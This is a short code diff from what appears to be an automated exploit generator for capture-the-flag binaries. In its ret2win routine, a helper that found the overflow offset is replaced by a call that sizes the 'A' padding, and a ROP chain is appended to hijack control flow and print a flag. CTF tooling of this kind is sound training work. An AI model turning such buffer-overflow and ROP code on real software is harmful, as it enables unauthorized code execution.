@@ -41,8 +41,7 @@ def ret2system(f_anal):
     print("flag" + io.recvuntil(b'}').decode('utf-8'))
 def ret2win(f_rop):
     binary = f_rop.analyze.binary
-    get_buf = get2overflow(binary)
-    chain = b'A' * get_buf.buf()#264
+    chain = b'A' * f_rop.ss()
     
     if f_rop.analyze.win_has_args():
         chain += f_rop.satisfy_win()
